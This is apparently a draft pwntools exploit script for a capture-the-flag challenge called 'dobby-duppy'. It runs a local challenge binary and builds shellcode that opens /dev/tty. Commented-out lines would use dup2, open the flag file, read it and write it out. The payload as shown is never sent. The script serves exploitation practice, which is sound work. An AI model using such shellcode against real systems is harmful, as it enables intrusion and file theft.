from pwn import *

context.arch = "amd64"

rem = process("./Pwnable/dobby-duppy/problem/chall")
# gdb.attach(rem)

payload = asm(shellcraft.open("/dev/tty"))
# payload += asm(shellcraft.dup2('rax', 1) )
# payload += asm(shellcraft.open("./Pwnable/dobby-duppy/problem/flag", 0))
# payload += asm("mov rdi, rax")
# payload += asm("mov rsi, rsp")
# payload += asm("sub rsi, 0x30")
# payload += asm(shellcraft.read("rdi", "rsi", 0x30))
# payload += asm(shellcraft.write(1, "rsi", 0x30))
# print(len(payload))
rem.sendlineafter(b":) ", b"")
rem.recvuntil(b"bliiiiiiiiind\n")
print(rem.recvall())